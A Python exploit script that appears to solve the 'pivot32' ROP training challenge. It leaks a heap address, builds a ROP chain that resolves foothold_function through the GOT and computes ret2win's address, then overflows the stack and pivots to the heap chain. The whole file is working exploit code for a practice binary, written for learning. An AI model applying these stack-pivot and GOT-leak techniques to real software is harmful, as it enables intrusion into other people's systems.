#!/usr/bin/python
import sys
import struct
import subprocess
import os
import signal

deadcode = b'\xde\xc0\xad\xde'

# 0x08048520  foothold_function@plt
foothold_function = b'\x20\x85\x04\x08'

# 0x0804882c pop eax ; ret
pop_eax_ret = b'\x2c\x88\x04\x08'

# 0x0804882e xchg esp,eax ; ret
xchg_esp_eax_ret = b'\x2e\x88\x04\x08'

# 0x08048830 mov eax, DWORD PTR [eax] ; ret
mov_eax_dword_ptr_eax = b'\x30\x88\x04\x08'

# 0x080485f0 : call eax
call_eax = b'\xf0\x85\x04\x08'

def read_until(p, token, echo=True):
    """
        Read bytes until 'token' is seen. Returns the full buffer.
    """
    buf = bytearray()
    tlen = len(token)
    while True:
        b = p.stdout.read(1)
        if not b:
            break  # EOF
        buf += b
        if echo:
            sys.stdout.buffer.write(b)
            sys.stdout.buffer.flush()
        if buf[-tlen:] == token:
            break
    return bytes(buf)

def stack_pivot(addr):
    """
        Pops desired address into eax,
        and exchanges it with esp.
    """

    # return to pop eax/ret gadget;
    # set up argument for xchg call;
    # ret to xchg call
    payload = pop_eax_ret + \
            addr + \
            xchg_esp_eax_ret

    return payload

def read_4_into_eax(addr):
    """
        Four-byte arbitrary read primitive using the following gadgets:
        0x08048830 mov eax, DWORD PTR [eax] ; ret
        0x0804882c pop eax ; ret
        Resulting value goes into eax.
    """
    payload = pop_eax_ret + \
            addr + \
            mov_eax_dword_ptr_eax

    return payload

def add_to_eax(value):
    """
        Uses the following gadgets:
        0x08048833 : add eax,ebx ; ret
        0x080484a9 : pop ebx ; ret
    """
    pop_ebx_ret = b'\xa9\x84\x04\x08'
    add_eax_ebx_ret = b'\x33\x88\x04\x08'

    # ret to pop/ebx/ret gadget;
    # set up registers for add;
    # ret to add
    payload = pop_ebx_ret + \
            value + \
            add_eax_ebx_ret

    return payload

def main(launch_gdb=True):
    """
        Annoyingly I have to interact with the process
        to read stdout
    """
    p = subprocess.Popen(
        ["./pivot32"],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE
    )

    os.kill(p.pid, signal.SIGSTOP)

    if launch_gdb:
        subprocess.Popen([
            "gnome-terminal", "--",
            "gdb", "-q", "-x", "script.gdb",
            "-ex", "continue",
            "-p", str(p.pid)
        ])

        input("GDB attached? Press Enter to continue... ")

    os.kill(p.pid, signal.SIGCONT)

    while True:
        line = p.stdout.readline()
        print(f"Received line: {line}")

        if b"The Old Gods" in line:
            heap_address = line.decode('utf-8').strip().split(":")[-1].strip()
            print(f"Got heap address: {heap_address}")

            # convert to bytes
            # e.g. a string 0xf7d25f10 -> bytes
            heap_address = struct.pack("<I", int(heap_address, 16))
            break

    read_until(p, b'> ')

    # from objdump -R pivot32 ; here is the GOT address of foothold_function
    # prior to being called; it will point to the plt stub, after being called,
    # it should have the runtime address of foothold_function
    # 0804a024 R_386_JUMP_SLOT   foothold_function
    foothold_function_got = b'\x24\xa0\x04\x08'

    # from objdump -T libpivot32.so
    # 0000077d g    DF .text  0000002b  Base        foothold_function
    # 00000974 g    DF .text  000000a4  Base        ret2win
    foothold_function_offset = int("0000077d", 16)
    ret2win_function_offset  = int("00000974", 16)
    ret2win_delta = ret2win_function_offset - foothold_function_offset
    print(f"ret2win_delta: {ret2win_delta:#010x}")

    delta_bytes = struct.pack("<I", ret2win_delta)

    # call foothold_function@plt to resolve it;
    # read the GOT entry for foothold_function,
    # which will now contain the
    # runtime address of foothold_function in libpivot32.so
    # this gets stored into eax with the read4 primitive
    rop_chain_heap = foothold_function + \
        read_4_into_eax(foothold_function_got)

    # load the ret2win_delta value into ebx;
    # add it to eax; should give us the runtime address of ret2win
    rop_chain_heap += add_to_eax(delta_bytes)

    # nice gadget to finish the deal
    rop_chain_heap += call_eax

    print("Writing ROP chain... ")
    p.stdin.write(rop_chain_heap)
    p.stdin.flush()

    # Read until the second prompt
    while True:
        line = p.stdout.readline()
        print(f"Received line: {line}")
        if b'stack smash' in line:
            break

    read_until(p, b'> ')

    payload = b'A'*40
    payload += b'B'*4 # ebp
    payload += stack_pivot(heap_address)
    
    p.stdin.write(payload)
    p.stdin.flush()

    read_until(p, b'never happens')

if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1] == "gdb":
        main(launch_gdb=True)
    else:
        main(launch_gdb=False)
